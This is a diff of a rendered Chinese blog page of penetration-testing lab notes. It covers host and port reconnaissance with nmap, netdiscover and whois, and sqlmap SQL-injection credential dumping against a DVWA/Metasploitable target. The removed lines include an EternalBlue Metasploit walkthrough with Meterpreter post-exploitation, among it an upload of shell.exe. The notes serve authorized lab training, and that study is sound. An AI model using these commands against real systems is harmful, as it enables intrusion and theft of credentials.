@@ -260,97 +260,163 @@
 <h2 id="4-2-信息收集实验-（渗透测试的核心前期工作，通过多维度获取目标系统信息。）"><a href="#4-2-信息收集实验-（渗透测试的核心前期工作，通过多维度获取目标系统信息。）" class="headerlink" title="4.2 信息收集实验  （渗透测试的核心前期工作，通过多维度获取目标系统信息。）"></a>4.2 信息收集实验  （渗透测试的核心前期工作，通过多维度获取目标系统信息。）</h2><h3 id="发现主机"><a href="#发现主机" class="headerlink" title="- 发现主机"></a>- 发现主机</h3><h4 id="IP地址规则"><a href="#IP地址规则" class="headerlink" title="- IP地址规则"></a>- IP地址规则</h4><ul>
 <li>工具：<code>netmask</code>  </li>
 <li>功能：计算IP范围对应的子网掩码格式。  </li>
-<li>命令示例：  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">  netmask 192.168.137.0-192.168.137.255  <span class="comment"># 输出掩码：255.255.255.0</span></span><br><span class="line">  ```  </span><br><span class="line"></span><br><span class="line"><span class="comment">#### - 确定网络拓扑  </span></span><br><span class="line">- 工具：`traceroute`  </span><br><span class="line">- 功能：探测网络路径，区分外网/局域网环境。  </span><br><span class="line">- 命令示例：  </span><br><span class="line">  ```bash</span><br><span class="line">  traceroute www.baidu.com  <span class="comment"># 查看公网路由</span></span><br><span class="line">  traceroute 192.168.1.1    <span class="comment"># 查看局域网路由</span></span><br><span class="line">  ```  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### - 扫描主机  </span></span><br><span class="line"><span class="comment">#### - Nmap工具  </span></span><br><span class="line">- 探测存活主机：  </span><br><span class="line">  ```bash</span><br><span class="line">  nmap -sP 192.168.1.0/24  <span class="comment"># 扫描网段内存活主机</span></span><br><span class="line">  ```  </span><br><span class="line">- 端口扫描：  </span><br><span class="line">  ```bash</span><br><span class="line">  nmap -p 1-65535 192.168.1.100  <span class="comment"># 全端口扫描</span></span><br><span class="line">  nmap -F 192.168.1.100  <span class="comment"># 快速扫描前100个端口</span></span><br><span class="line">  ```  </span><br><span class="line">- 操作系统探测：  </span><br><span class="line">  ```bash</span><br><span class="line">  nmap -O 192.168.1.100  <span class="comment"># 识别目标操作系统类型</span></span><br><span class="line">  ```  </span><br><span class="line"></span><br><span class="line"><span class="comment">#### - Netdiscover工具（ARP主动扫描）  </span></span><br><span class="line">- 命令示例：  </span><br><span class="line">  ```bash</span><br><span class="line">  netdiscover -i eth0 -r 192.168.1.0/24  <span class="comment"># 指定网卡和扫描范围</span></span><br><span class="line">  ```  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### - 监听发现主机  </span></span><br><span class="line"><span class="comment">#### - Netdiscover被动模式（ARP监听）  </span></span><br><span class="line">- 命令示例：  </span><br><span class="line">  ```bash</span><br><span class="line">  netdiscover -i eth0 -p  <span class="comment"># -p参数启用被动监听模式</span></span><br><span class="line">  ```  </span><br><span class="line"></span><br><span class="line"><span class="comment">#### - DHCP监听  </span></span><br><span class="line">- 工具：`dhcpdump` 或抓包工具（如Wireshark）  </span><br><span class="line">- 功能：捕获DHCP协议包，获取新上线设备的IP分配信息。  </span><br><span class="line">- 命令示例（Wireshark过滤DHCP）：  </span><br><span class="line">  ```bash</span><br><span class="line">  <span class="comment"># 在Wireshark中设置过滤规则</span></span><br><span class="line">  dhcp  <span class="comment"># 仅显示DHCP相关数据包</span></span><br><span class="line">  ```  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### - 域名信息分析  </span></span><br><span class="line"><span class="comment">#### - whois工具  </span></span><br><span class="line">- 功能：查询域名注册信息、所有者、过期时间等。  </span><br><span class="line">- 命令示例：  </span><br><span class="line">  ```bash</span><br><span class="line">  whois baidu.com  <span class="comment"># 查询百度域名信息</span></span><br><span class="line">  ```  </span><br><span class="line"></span><br><span class="line"><span class="comment">#### - dmitry工具（子域名查询）  </span></span><br><span class="line">- 依赖：需VPN访问境外域名服务器。  </span><br><span class="line">- 命令示例：  </span><br><span class="line">  ```bash</span><br><span class="line">  dmitry -w baidu.com  <span class="comment"># -w参数扫描子域名</span></span><br><span class="line">  ```  </span><br><span class="line"></span><br><span class="line"><span class="comment">#### - nslookup工具（域名解析）  </span></span><br><span class="line">- 功能：将域名转换为IP地址，或反向查询。  </span><br><span class="line">- 命令示例：  </span><br><span class="line">  ```bash</span><br><span class="line">  nslookup baidu.com  <span class="comment"># 正向解析</span></span><br><span class="line">  nslookup 14.215.177.38  <span class="comment"># 反向解析IP对应的域名</span></span><br><span class="line">  ```  </span><br><span class="line"></span><br><span class="line"><span class="comment">#### - ping命令（域名探测）  </span></span><br><span class="line">- 功能：测试域名连通性，获取响应时间和TTL值。  </span><br><span class="line">- 命令示例：  </span><br><span class="line">  ```bash</span><br><span class="line">  ping baidu.com  <span class="comment"># 探测域名是否可达</span></span><br><span class="line">  ```  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### - 扫描端口  </span></span><br><span class="line"><span class="comment">#### - 端口基础认知  </span></span><br><span class="line">- 分类：  </span><br><span class="line">  - 知名端口（0-1023）：如80（HTTP）、443（HTTPS）、22（SSH）。  </span><br><span class="line">  - 注册端口（1024-49151）：如3389（RDP）、1433（SQL Server）。  </span><br><span class="line">  - 动态端口（49152-65535）：临时分配给客户端程序。  </span><br><span class="line">- 用途示例：  </span><br><span class="line">  - 80端口开放 → 目标可能运行Web服务；  </span><br><span class="line">  - 22端口开放 → 可能允许SSH远程登录。  </span><br><span class="line"></span><br><span class="line"><span class="comment">#### - nmap端口扫描实战  </span></span><br><span class="line">- 全端口扫描：  </span><br><span class="line">  ```bash</span><br><span class="line">  nmap -p 1-65535</span><br></pre></td></tr></table></figure></li>
+<li>命令示例： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netmask 192.168.137.0-192.168.137.255  <span class="comment"># 输出掩码：255.255.255.0</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="确定网络拓扑"><a href="#确定网络拓扑" class="headerlink" title="- 确定网络拓扑"></a>- 确定网络拓扑</h4><ul>
+<li>工具：<code>traceroute</code>  </li>
+<li>功能：探测网络路径，区分外网&#x2F;局域网环境。  </li>
+<li>命令示例：  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">  traceroute www.baidu.com  <span class="comment"># 查看公网路由</span></span><br><span class="line">  traceroute 192.168.1.1    <span class="comment"># 查看局域网路由</span></span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### - 扫描主机  </span></span><br><span class="line"><span class="comment">#### - Nmap工具  </span></span><br><span class="line">- 探测存活主机：  </span><br><span class="line">```bash</span><br><span class="line">  nmap -sP 192.168.1.0/24  <span class="comment"># 扫描网段内存活主机</span></span><br><span class="line">```  </span><br><span class="line">- 端口扫描：  </span><br><span class="line"> ```bash</span><br><span class="line">  nmap -p 1-65535 192.168.1.100  <span class="comment"># 全端口扫描</span></span><br><span class="line">  nmap -F 192.168.1.100  <span class="comment"># 快速扫描前100个端口</span></span><br><span class="line">  ```  </span><br><span class="line">- 操作系统探测：  </span><br><span class="line">```bash</span><br><span class="line">  nmap -O 192.168.1.100  <span class="comment"># 识别目标操作系统类型</span></span><br><span class="line">  ```  </span><br><span class="line"></span><br><span class="line"><span class="comment">#### - Netdiscover工具（ARP主动扫描）  </span></span><br><span class="line">- 命令示例：  </span><br><span class="line">```bash</span><br><span class="line">  netdiscover -i eth0 -r 192.168.1.0/24  <span class="comment"># 指定网卡和扫描范围</span></span><br><span class="line">  ```  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### - 监听发现主机  </span></span><br><span class="line"><span class="comment">#### - Netdiscover被动模式（ARP监听）  </span></span><br><span class="line">- 命令示例：  </span><br><span class="line">```bash</span><br><span class="line">  netdiscover -i eth0 -p  <span class="comment"># -p参数启用被动监听模式</span></span><br><span class="line">  ```  </span><br><span class="line"></span><br><span class="line"><span class="comment">#### - DHCP监听  </span></span><br><span class="line">- 工具：`dhcpdump` 或抓包工具（如Wireshark）  </span><br><span class="line">- 功能：捕获DHCP协议包，获取新上线设备的IP分配信息。  </span><br><span class="line">- 命令示例（Wireshark过滤DHCP）：  </span><br><span class="line">```bash</span><br><span class="line">  <span class="comment"># 在Wireshark中设置过滤规则</span></span><br><span class="line">  dhcp  <span class="comment"># 仅显示DHCP相关数据包</span></span><br><span class="line">  ```  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### - 域名信息分析  </span></span><br><span class="line"><span class="comment">#### - whois工具  </span></span><br><span class="line">- 功能：查询域名注册信息、所有者、过期时间等。  </span><br><span class="line">- 命令示例：  </span><br><span class="line">```bash</span><br><span class="line">  whois baidu.com  <span class="comment"># 查询百度域名信息</span></span><br><span class="line">  ```  </span><br><span class="line"></span><br><span class="line"><span class="comment">#### - dmitry工具（子域名查询）  </span></span><br><span class="line">- 依赖：需VPN访问境外域名服务器。  </span><br><span class="line">- 命令示例：  </span><br><span class="line">```bash</span><br><span class="line">  dmitry -w baidu.com  <span class="comment"># -w参数扫描子域名</span></span><br><span class="line">  ```  </span><br><span class="line"></span><br><span class="line"><span class="comment">#### - nslookup工具（域名解析）  </span></span><br><span class="line">- 功能：将域名转换为IP地址，或反向查询。  </span><br><span class="line">- 命令示例：  </span><br><span class="line">```bash</span><br><span class="line">  nslookup baidu.com  <span class="comment"># 正向解析</span></span><br><span class="line">  nslookup 14.215.177.38  <span class="comment"># 反向解析IP对应的域名</span></span><br><span class="line">  ```  </span><br><span class="line"></span><br><span class="line"><span class="comment">#### - ping命令（域名探测）  </span></span><br><span class="line">- 功能：测试域名连通性，获取响应时间和TTL值。  </span><br><span class="line">- 命令示例：  </span><br><span class="line">```bash</span><br><span class="line">  ping baidu.com  <span class="comment"># 探测域名是否可达</span></span><br><span class="line">  ```  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### - 扫描端口  </span></span><br><span class="line"><span class="comment">#### - 端口基础认知  </span></span><br><span class="line">- 分类：  </span><br><span class="line">  - 知名端口（0-1023）：如80（HTTP）、443（HTTPS）、22（SSH）。  </span><br><span class="line">  - 注册端口（1024-49151）：如3389（RDP）、1433（SQL Server）。  </span><br><span class="line">  - 动态端口（49152-65535）：临时分配给客户端程序。  </span><br><span class="line">- 用途示例：  </span><br><span class="line">  - 80端口开放 → 目标可能运行Web服务；  </span><br><span class="line">  - 22端口开放 → 可能允许SSH远程登录。  </span><br><span class="line"></span><br><span class="line"><span class="comment">#### - nmap端口扫描实战  </span></span><br><span class="line">- 全端口扫描：  </span><br><span class="line">```bash</span><br><span class="line">  nmap -p 1-65535</span><br></pre></td></tr></table></figure></li>
 <li>快速扫描： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -F &lt;IP&gt; 仅扫描前100个常用端口，适用于初步探测。</span><br></pre></td></tr></table></figure></li>
 </ul>
 <h2 id="4-3-Metasploitable靶机攻击实验"><a href="#4-3-Metasploitable靶机攻击实验" class="headerlink" title="4.3 Metasploitable靶机攻击实验"></a>4.3 Metasploitable靶机攻击实验</h2><h3 id="一、实验目标"><a href="#一、实验目标" class="headerlink" title="一、实验目标"></a>一、实验目标</h3><p>通过对 Metasploitable 靶机中 DVWA 平台的渗透测试，掌握网络环境探测、SQL 注入漏洞利用及数据库渗透的方法，获取靶机用户凭据，验证 Web 应用安全漏洞的风险。  </p>
 <h3 id="二、实验方法与步骤"><a href="#二、实验方法与步骤" class="headerlink" title="二、实验方法与步骤"></a>二、实验方法与步骤</h3><h4 id="（一）网络环境探测"><a href="#（一）网络环境探测" class="headerlink" title="（一）网络环境探测"></a>（一）网络环境探测</h4><ol>
-<li><strong>查看本地 IP 地址</strong><br>打开 Kali Linux 终端，执行命令查看网卡 IP 信息：  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">   ifconfig  </span><br><span class="line">   <span class="comment"># 关注 eth0、enp0s3 等网卡，获取本地 IP（如 192.168.40.130 ）</span></span><br><span class="line">   ```  </span><br><span class="line"></span><br><span class="line">2. **扫描网段存活主机**  </span><br><span class="line">   使用 `nmap` 扫描同一网段（需替换为实际网段，如 `192.168.40.0/24` ），定位靶机：  </span><br><span class="line">   ```bash</span><br><span class="line">   nmap -sP 192.168.40.0/24  </span><br><span class="line">   <span class="comment"># 扫描结果中，筛选开放 Web 端口（80、8080 等）的 IP，作为 DVWA 靶机候选</span></span><br><span class="line">   ```  </span><br><span class="line"></span><br><span class="line">3. **定位靶机**  </span><br><span class="line">   浏览器访问扫描到的 IP，若显示 DVWA 登录页面，则确认靶机。  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#### （二）漏洞利用准备  </span></span><br><span class="line">- **目标漏洞**：DVWA 平台存在 **SQL 注入**、**命令执行** 等漏洞（需提前部署 DVWA 环境）。  </span><br><span class="line">- **工具**：`sqlmap`（数据库渗透）、浏览器开发者工具（抓包 Cookies ）。  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#### （三）漏洞探测与利用  </span></span><br><span class="line">1. **捕获登录 Cookies**  </span><br><span class="line">   - 浏览器访问 DVWA 登录页，输入默认账号密码（`admin:password` ）登录。  </span><br><span class="line">   - 按 `F12` 打开开发者工具 → 切换到 `Network` 标签 → 刷新页面，在请求头中复制 **Cookies** 值（用于维持登录态）。  </span><br><span class="line"></span><br><span class="line">2. **SQL 注入点探测**  </span><br><span class="line">   - 访问 DVWA 的 `SQL Injection` 模块，在输入框尝试注入测试：  </span><br><span class="line">     - 输入 `<span class="string">&#x27;` ，观察页面是否报错（判断是否存在字符型注入）。  </span></span><br><span class="line"><span class="string">     - 输入 `1&#x27;</span> AND 1=1--` ，观察结果是否正常显示（验证注入点可控）。  </span><br><span class="line"></span><br><span class="line">3. **数据库渗透（`sqlmap` 工具）**  </span><br><span class="line">   替换命令中 `http://靶机IP` 为实际地址，`获取的Cookies` 为浏览器复制的值，逐步执行：  </span><br><span class="line"></span><br><span class="line">   - **探测数据库类型**：  </span><br><span class="line">     ```bash</span><br><span class="line">     sqlmap -u <span class="string">&quot;http://靶机IP/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;</span> --cookie=<span class="string">&quot;获取的Cookies&quot;</span> -dbs  </span><br><span class="line">     <span class="comment"># 输出结果包含数据库名称（如 dvwa ）</span></span><br><span class="line">     ```  </span><br><span class="line"></span><br><span class="line">   - **枚举数据库表名（以 dvwa 为例）**：  </span><br><span class="line">     ```bash</span><br><span class="line">     sqlmap -u <span class="string">&quot;http://靶机IP/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;</span> --cookie=<span class="string">&quot;获取的Cookies&quot;</span> -D dvwa --tables  </span><br><span class="line">     <span class="comment"># 输出表名（如 users 表）</span></span><br><span class="line">     ```  </span><br><span class="line"></span><br><span class="line">   - **提取表字段（以 <span class="built_in">users</span> 表为例）**：  </span><br><span class="line">     ```bash</span><br><span class="line">     sqlmap -u <span class="string">&quot;http://靶机IP/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;</span> --cookie=<span class="string">&quot;获取的Cookies&quot;</span> -D dvwa -T <span class="built_in">users</span> --columns  </span><br><span class="line">     <span class="comment"># 输出字段（如 user、password ）</span></span><br><span class="line">     ```  </span><br><span class="line"></span><br><span class="line">   - **导出账号密码**：  </span><br><span class="line">     ```bash</span><br><span class="line">     sqlmap -u <span class="string">&quot;http://靶机IP/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;</span> --cookie=<span class="string">&quot;获取的Cookies&quot;</span> -D dvwa -T <span class="built_in">users</span> -C user,password --dump  </span><br><span class="line">     <span class="comment"># 输出用户凭据（如 admin:password ）</span></span><br><span class="line">     ```  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### 三、实验结果  </span></span><br><span class="line">- 成功获取 DVWA 平台的用户凭据，示例：  </span><br></pre></td></tr></table></figure>
-  user: admin<br>  password: password  # 或其他弱密码（如 123456 ）</li>
+<li><strong>查看本地 IP 地址</strong><br>打开 Kali Linux 终端，执行命令查看网卡 IP 信息：</li>
 </ol>
-<pre><code>- 验证了 SQL 注入漏洞的利用流程，实现从探测到数据库渗透的完整攻击链。  
-
-
-### 四、实验注意事项  
-1. **环境配置**：DVWA 需设置为 `Low` 安全级别（关闭防御机制），否则无法触发 SQL 注入。  
-2. **授权限制**：操作仅限授权靶机（如 Metasploitable ），禁止对未授权系统测试。  
-3. **命令适配**：`sqlmap` 命令需替换实际 `靶机IP` 和 `Cookies`，否则无法执行。  
-
-
----  
-
-
-## 4.4 永恒之蓝漏洞攻击实验  
-### 一、实验目标  
-利用 Metasploit 框架，针对 Windows 7 靶机的 **MS17-010（永恒之蓝）** 漏洞实施攻击，获取系统控制权限，验证 SMB 服务漏洞的风险。  
-
-
-### 二、实验方法与步骤  
-#### （一）网络环境探测  
-1. **查看本地 IP 地址**  
- 终端执行命令，获取 Kali 攻击机 IP：  
- ```bash
- ifconfig  
- # 示例输出：192.168.40.130（需替换为实际 IP ）
+<pre><code class="bash">   ifconfig  
+   # 关注 eth0、enp0s3 等网卡，获取本地 IP（如 192.168.40.130 ）
 </code></pre>
 <ol start="2">
-<li><strong>扫描靶机 445 端口</strong><br>使用 <code>nmap</code> 扫描同一网段（如 <code>192.168.40.0/24</code> ），检测 445 端口（SMB 服务）状态：  <pre><code class="bash">nmap -sS -p 445 192.168.40.0/24  
-# 若靶机 IP 显示 445/tcp open ，则存在永恒之蓝攻击面
-</code></pre>
-</li>
+<li><strong>扫描网段存活主机</strong><br>使用 <code>nmap</code> 扫描同一网段（需替换为实际网段，如 <code>192.168.40.0/24</code> ），定位靶机：</li>
 </ol>
-<h4 id="（二）漏洞利用（Metasploit-框架）"><a href="#（二）漏洞利用（Metasploit-框架）" class="headerlink" title="（二）漏洞利用（Metasploit 框架）"></a>（二）漏洞利用（Metasploit 框架）</h4><ol>
-<li><p><strong>启动 MSF 控制台</strong><br>终端执行命令，进入 Metasploit 交互环境：  </p>
-<pre><code class="bash">msfconsole  
+<pre><code class="bash">   nmap -sP 192.168.40.0/24  
+   # 扫描结果中，筛选开放 Web 端口（80、8080 等）的 IP，作为 DVWA 靶机候选
 </code></pre>
-</li>
-<li><p><strong>搜索永恒之蓝模块</strong><br>在 MSF 控制台，搜索漏洞利用模块：  </p>
-<pre><code class="bash">search ms17_010  
-# 选择 exploit/windows/smb/ms17_010_eternalblue 模块
-</code></pre>
-</li>
-<li><p><strong>配置攻击参数</strong><br>依次设置目标 IP、本地 IP（攻击机）：  </p>
-<pre><code class="bash">use exploit/windows/smb/ms17_010_eternalblue  
-set RHOSTS 192.168.40.100  # 替换为实际靶机 IP（如 Win7 地址）
-set LHOST 192.168.40.130  # 替换为攻击机 IP（Kali 地址）
-</code></pre>
-</li>
-<li><p><strong>执行攻击，获取 Meterpreter 会话</strong><br>启动攻击，等待返回 Meterpreter 控制会话：  </p>
-<pre><code class="bash">exploit  
-# 若成功，显示 Meterpreter session opened
-</code></pre>
-</li>
+<ol start="3">
+<li><strong>定位靶机</strong><br>浏览器访问扫描到的 IP，若显示 DVWA 登录页面，则确认靶机。</li>
 </ol>
-<h4 id="（三）后渗透操作"><a href="#（三）后渗透操作" class="headerlink" title="（三）后渗透操作"></a>（三）后渗透操作</h4><p>获取会话后，执行以下操作验证控制权限：  </p>
-<ol>
-<li><p><strong>捕获靶机屏幕</strong>  </p>
-<pre><code class="bash">screenshot  
-# 生成屏幕截图文件（可下载查看）
-</code></pre>
-</li>
-<li><p><strong>上传&#x2F;下载文件</strong>  </p>
+<h4 id="（二）漏洞利用准备"><a href="#（二）漏洞利用准备" class="headerlink" title="（二）漏洞利用准备"></a>（二）漏洞利用准备</h4><ul>
+<li><strong>目标漏洞</strong>：DVWA 平台存在 <strong>SQL 注入</strong>、<strong>命令执行</strong> 等漏洞（需提前部署 DVWA 环境）。  </li>
+<li><strong>工具</strong>：<code>sqlmap</code>（数据库渗透）、浏览器开发者工具（抓包 Cookies ）。</li>
+</ul>
+<h4 id="（三）漏洞探测与利用"><a href="#（三）漏洞探测与利用" class="headerlink" title="（三）漏洞探测与利用"></a>（三）漏洞探测与利用</h4><ol>
+<li><p><strong>捕获登录 Cookies</strong>  </p>
 <ul>
-<li>上传文件到靶机：  <pre><code class="bash">upload /本地文件路径 目标路径  
-# 示例：upload /root/shell.exe C:\Temp\ 
-</code></pre>
+<li>浏览器访问 DVWA 登录页，输入默认账号密码（<code>admin:password</code> ）登录。  </li>
+<li>按 <code>F12</code> 打开开发者工具 → 切换到 <code>Network</code> 标签 → 刷新页面，在请求头中复制 <strong>Cookies</strong> 值（用于维持登录态）。</li>
+</ul>
 </li>
-<li>从靶机下载文件：  <pre><code class="bash">download 目标文件路径 /本地保存路径  
-# 示例：download C:\Users\flag.txt /root/ 
-</code></pre>
+<li><p><strong>SQL 注入点探测</strong>  </p>
+<ul>
+<li>访问 DVWA 的 <code>SQL Injection</code> 模块，在输入框尝试注入测试：  <ul>
+<li>输入 <code>&#39;</code> ，观察页面是否报错（判断是否存在字符型注入）。  </li>
+<li>输入 <code>1&#39; AND 1=1--</code> ，观察结果是否正常显示（验证注入点可控）。</li>
+</ul>
 </li>
 </ul>
 </li>
-<li><p><strong>获取系统信息</strong>  </p>
-<pre><code class="bash">sysinfo  
-# 输出靶机系统版本（如 Windows 7 Professional SP1 x64 ）
-</code></pre>
-</li>
-<li><p><strong>枚举系统用户</strong>  </p>
-<pre><code class="bash">run post/windows/gather/enum_users  
-# 输出用户列表（如 Administrator、Guest ）
-</code></pre>
+<li><p><strong>数据库渗透（<code>sqlmap</code> 工具）</strong><br>替换命令中 <code>http://靶机IP</code> 为实际地址，<code>获取的Cookies</code> 为浏览器复制的值，逐步执行：  </p>
+<ul>
+<li><strong>探测数据库类型</strong>：</li>
+</ul>
 </li>
 </ol>
+<pre><code class="bash">     sqlmap -u &quot;http://靶机IP/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;获取的Cookies&quot; -dbs  
+     # 输出结果包含数据库名称（如 dvwa ）
+</code></pre>
+<ul>
+<li><strong>枚举数据库表名（以 dvwa 为例）</strong>：</li>
+</ul>
+<pre><code class="bash">     sqlmap -u &quot;http://靶机IP/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;获取的Cookies&quot; -D dvwa --tables  
+     # 输出表名（如 users 表）
+</code></pre>
+<ul>
+<li><strong>提取表字段（以 users 表为例）</strong>：</li>
+</ul>
+<pre><code class="bash">     sqlmap -u &quot;http://靶机IP/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;获取的Cookies&quot; -D dvwa -T users --columns  
+     # 输出字段（如 user、password ）
+</code></pre>
+<ul>
+<li><strong>导出账号密码</strong>：</li>
+</ul>
+<pre><code class="bash">     sqlmap -u &quot;http://靶机IP/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;获取的Cookies&quot; -D dvwa -T users -C user,password --dump  
+     # 输出用户凭据（如 admin:password ）
+</code></pre>
+<h3 id="三、实验结果"><a href="#三、实验结果" class="headerlink" title="三、实验结果"></a>三、实验结果</h3><ul>
+<li>成功获取 DVWA 平台的用户凭据，示例：</li>
+</ul>
+<pre><code class="bash">  user: admin  
+  password: password  # 或其他弱密码（如 123456 ）
+</code></pre>
+<ul>
+<li>验证了 SQL 注入漏洞的利用流程，实现从探测到数据库渗透的完整攻击链。</li>
+</ul>
+<h3 id="四、实验注意事项"><a href="#四、实验注意事项" class="headerlink" title="四、实验注意事项"></a>四、实验注意事项</h3><ol>
+<li><strong>环境配置</strong>：DVWA 需设置为 <code>Low</code> 安全级别（关闭防御机制），否则无法触发 SQL 注入。  </li>
+<li><strong>授权限制</strong>：操作仅限授权靶机（如 Metasploitable ），禁止对未授权系统测试。  </li>
+<li><strong>命令适配</strong>：<code>sqlmap</code> 命令需替换实际 <code>靶机IP</code> 和 <code>Cookies</code>，否则无法执行。</li>
+</ol>
+<hr>
